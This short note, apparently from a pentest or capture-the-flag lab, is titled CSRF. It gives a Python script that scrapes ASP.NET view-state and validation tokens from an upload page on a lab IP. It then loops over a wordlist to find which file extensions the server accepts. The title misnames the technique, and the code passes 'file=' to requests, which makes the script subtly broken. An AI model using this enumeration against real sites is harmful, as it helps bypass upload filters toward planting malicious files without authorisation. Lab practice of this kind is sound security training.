# Cross-site request forgery (CSRF)

Python script to read out validation stuff to create other requests

```python
import requests
import re

def TestUpload(filename):
	url = "http://10.10.10.93/transfer.aspx"
	burp = { 'http' : "http://127.0.0.1:8080" }
	s = requests.session()

	r = s.get(url)
	ViewState = re.findall(r'__VIEWSTATE" value="(.*?)"', r.text)[0]
	EventValidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"', r.text)[0]

	post_data = {
		'__VIEWSTATE' : ViewState,
		'__EVENTVALIDATION' : EventValidation,
		'btnUpload' : 'upload'
	}

	uploaded_file = { 'FileUpload1' : (filename, 'contents of file') }
	r = s.post(url, file = uploaded_file, data = post_data, proxies = burp)
	return r.text

for extension in open('extensions.lst', 'r'):
	response = TestUpload('bla' + extension[:-1])
	if "Invalid File" not in response:
		print(extension)

```
